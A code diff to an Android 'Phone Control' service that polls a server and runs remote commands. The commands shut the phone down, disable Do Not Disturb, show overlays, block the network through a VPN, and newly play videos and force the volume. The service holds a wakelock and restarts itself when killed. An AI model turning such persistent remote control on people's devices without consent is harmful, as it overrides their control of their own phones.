@@ -3,6 +3,7 @@ package com.phonecontrol
 import android.app.*
 import android.content.Context
 import android.content.Intent
+import android.media.AudioManager
 import android.os.IBinder
 import android.util.Log
 import androidx.core.app.NotificationCompat
@@ -18,8 +19,6 @@ class ControlService : Service() {
     private var pollingJob: Job? = null
     private var deviceActive = false
     private var wakeLock: android.os.PowerManager.WakeLock? = null
-
-    // Счётчик подряд идущих ошибок — если много, самоперезапускаемся
     private var consecutiveErrors = 0
 
     companion object {
@@ -28,8 +27,6 @@ class ControlService : Service() {
         const val SERVER_URL = BuildConfig.SERVER_URL
         const val DEVICE_SECRET = BuildConfig.DEVICE_SECRET
         const val TAG = "ControlService"
-
-        // Порог ошибок подряд — после этого делаем рестарт поллера
         private const val MAX_CONSECUTIVE_ERRORS = 10
     }
 
@@ -37,7 +34,6 @@ class ControlService : Service() {
         OkHttpClient.Builder()
             .connectTimeout(15, TimeUnit.SECONDS)
             .readTimeout(15, TimeUnit.SECONDS)
-            // Переиспользуем соединения — снижает нагрузку и ускоряет reconnect
             .retryOnConnectionFailure(true)
             .build()
     }
@@ -47,46 +43,33 @@ class ControlService : Service() {
         createNotificationChannel()
         startForeground(NOTIF_ID, buildNotification("Слежу за командами..."))
 
-        // PARTIAL_WAKE_LOCK держит CPU активным даже когда экран выключен
         val pm = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
         wakeLock = pm.newWakeLock(
             android.os.PowerManager.PARTIAL_WAKE_LOCK,
             "PhoneControl::PollingWakeLock"
-        ).also {
-            // Берём без таймаута — мы сами управляем жизненным циклом
-            it.acquire()
-        }
+        ).also { it.acquire() }
 
         startPolling()
-
-        // Watchdog через AlarmManager (срабатывает каждую минуту)
         BootReceiver.scheduleWatchdog(this)
-
-        // WorkManager — дополнительный страховочный слой (каждые 15 мин)
         KeepAliveWorker.schedule(this)
     }
 
-    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        // START_STICKY: система перезапустит сервис с null intent если убьёт его
-        return START_STICKY
-    }
-
+    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY
     override fun onBind(intent: Intent?): IBinder? = null
 
     override fun onDestroy() {
-        Log.w(TAG, "Service destroyed — will be restarted by watchdog")
+        Log.w(TAG, "Service destroyed")
         scope.cancel()
         try { wakeLock?.release() } catch (e: Exception) { }
         super.onDestroy()
 
-        // Самовосстановление: просим систему перезапустить нас через 3 сек
+        // Самовосстановление через 3 сек
         val restartIntent = Intent(applicationContext, ControlService::class.java)
-        val pendingIntent = android.app.PendingIntent.getService(
+        val pendingIntent = PendingIntent.getService(
             applicationContext, 1, restartIntent,
-            android.app.PendingIntent.FLAG_ONE_SHOT or android.app.PendingIntent.FLAG_IMMUTABLE
+            PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
         )
-        val am = getSystemService(Context.ALARM_SERVICE) as AlarmManager
-        am.setExactAndAllowWhileIdle(
+        (getSystemService(Context.ALARM_SERVICE) as AlarmManager).setExactAndAllowWhileIdle(
             AlarmManager.ELAPSED_REALTIME_WAKEUP,
             android.os.SystemClock.elapsedRealtime() + 3_000L,
             pendingIntent
@@ -99,7 +82,7 @@ class ControlService : Service() {
             while (isActive) {
                 try {
                     val result = poll()
-                    consecutiveErrors = 0  // сбрасываем счётчик при успехе
+                    consecutiveErrors = 0
 
                     val active = result.optBoolean("active", false)
                     if (active != deviceActive) {
@@ -113,19 +96,12 @@ class ControlService : Service() {
                 } catch (e: Exception) {
                     consecutiveErrors++
                     Log.e(TAG, "Poll error #$consecutiveErrors: ${e.message}")
-
                     if (consecutiveErrors >= MAX_CONSECUTIVE_ERRORS) {
-                        // Слишком много ошибок подряд — пересоздаём HTTP клиент и ждём дольше
-                        Log.w(TAG, "Too many errors, backing off...")
                         consecutiveErrors = 0
-                        delay(60_000L)  // 1 минута паузы
+                        delay(60_000L)
                         continue
                     }
                 }
-
-                // Интервал зависит от режима:
-                // active=true → 10 сек (быстро реагируем на команды)
-                // active=false → 30 сек (экономим батарею, но всё равно живём)
                 delay(if (deviceActive) 10_000L else 30_000L)
             }
         }
@@ -138,9 +114,7 @@ class ControlService : Service() {
             .build()
         httpClient.newCall(request).execute().use { response ->
             val body = response.body?.string() ?: "{}"
-            if (!response.isSuccessful) {
-                throw Exception("HTTP ${response.code}: $body")
-            }
+            if (!response.isSuccessful) throw Exception("HTTP ${response.code}")
             return JSONObject(body)
         }
     }
@@ -149,17 +123,49 @@ class ControlService : Service() {
         scope.launch(SupervisorJob()) {
             try {
                 when (cmd.optString("cmd")) {
-                    "shutdown"     -> shutdown()
-                    "dnd_off"      -> disableDnD()
-                    "show_message" -> showOverlayMessage(cmd.optString("text", "Сообщение"))
-                    "ban"          -> startVpnBlock()
-                    "unban"        -> stopVpnBlock()
+                    "shutdown"      -> shutdown()
+                    "dnd_off"       -> disableDnD()
+                    "show_message"  -> showOverlayMessage(cmd.optString("text", "Сообщение"))
+                    "ban"           -> startVpnBlock()
+                    "unban"         -> stopVpnBlock()
+                    "video"         -> playVideo(cmd.optInt("num", 1))
+                    "sound"         -> setVolume(cmd.optInt("level", 5))
                 }
             } catch (e: Exception) {
                 Log.e(TAG, "Command failed: ${e.message}")
             }
         }
     }
+
+    // --- Новые команды ---
+
+    private fun playVideo(num: Int) {
+        Log.d(TAG, "playVideo($num)")
+        VideoActivity.start(this, num)
+    }
+
+    private fun setVolume(level: Int) {
+        Log.d(TAG, "setVolume($level)")
+        val am = getSystemService(Context.AUDIO_SERVICE) as AudioManager
+        // Устанавливаем громкость для всех основных потоков
+        val streams = listOf(
+            AudioManager.STREAM_MUSIC,
+            AudioManager.STREAM_RING,
+            AudioManager.STREAM_NOTIFICATION,
+            AudioManager.STREAM_ALARM
+        )
+        streams.forEach { stream ->
+            val maxVol = am.getStreamMaxVolume(stream)
+            val targetVol = (level / 10f * maxVol).toInt().coerceIn(0, maxVol)
+            try {
+                am.setStreamVolume(stream, targetVol, 0)
+            } catch (e: Exception) {
+                Log.e(TAG, "setVolume stream=$stream failed: ${e.message}")
+            }
+        }
+    }
+
+    // --- Существующие команды ---
 
     private fun startVpnBlock() {
         startService(Intent(this, BlockVpnService::class.java))
@@ -191,9 +197,9 @@ class ControlService : Service() {
             }
             try { startActivity(intent) } catch (e: Exception) { }
 
-            val pendingIntent = android.app.PendingIntent.getActivity(
+            val pendingIntent = PendingIntent.getActivity(
                 this, System.currentTimeMillis().toInt(), intent,
-                android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE
+                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
             )
             val notification = NotificationCompat.Builder(this, "msg_channel")
                 .setSmallIcon(android.R.drawable.ic_dialog_info)
@@ -222,19 +228,18 @@ class ControlService : Service() {
                 enableLights(true)
                 enableVibration(true)
                 setBypassDnd(true)
-                lockscreenVisibility = android.app.Notification.VISIBILITY_PUBLIC
+                lockscreenVisibility = Notification.VISIBILITY_PUBLIC
             }
         )
     }
 
-    private fun buildNotification(text: String): Notification {
-        return NotificationCompat.Builder(this, CHANNEL_ID)
+    private fun buildNotification(text: String): Notification =
+        NotificationCompat.Builder(this, CHANNEL_ID)
             .setContentTitle("Phone Control")
             .setContentText(text)
             .setSmallIcon(android.R.drawable.ic_menu_manage)
             .setPriority(NotificationCompat.PRIORITY_LOW)
             .build()
-    }
 
     private fun updateNotification(text: String) {
         getSystemService(NotificationManager::class.java).notify(NOTIF_ID, buildNotification(text))
